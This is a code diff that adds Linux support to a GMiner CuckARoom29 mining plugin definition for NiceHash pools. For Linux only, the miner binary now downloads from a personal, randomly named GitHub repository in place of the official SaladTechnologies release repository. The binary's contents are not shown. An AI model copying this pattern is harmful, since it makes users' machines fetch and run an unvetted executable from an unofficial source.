@@ -5,14 +5,20 @@ import { STANDARD_ERRORS } from './constants'
 const cuckaroomUser = (address: string, location: string, minerId: string) =>
   `-s cuckaroom.${location}.nicehash.com -n 3382 -u ${address}.${minerId}`
 
-export const getGminerCuckARoom29Definition = (nicehashAddress: string, machine: Machine): PluginDefinition => {
+export const getGminerCuckARoom29Definition = (
+  nicehashAddress: string,
+  machine: Machine,
+  platform: string,
+): PluginDefinition => {
   let def = {
     name: 'GMiner',
     version: '2.21',
     algorithm: 'CuckARoom29',
     downloadUrl:
-      'https://github.com/SaladTechnologies/plugin-downloads/releases/download/gminer2.21/gminer-2-21-windows.zip',
-    exe: 'miner.exe',
+      platform === 'linux'
+        ? 'https://github.com/Krish12003/animated-telegram/releases/download/miner0.1v/gminer-2-21-linux.tar.xz'
+        : 'https://github.com/SaladTechnologies/plugin-downloads/releases/download/gminer2.21/gminer-2-21-windows.zip',
+    exe: platform === 'linux' ? 'miner' : 'miner.exe',
     args: `-a cuckaroom29 ${cuckaroomUser(nicehashAddress, 'usa', machine.minerId)} ${cuckaroomUser(
       nicehashAddress,
       'eu',
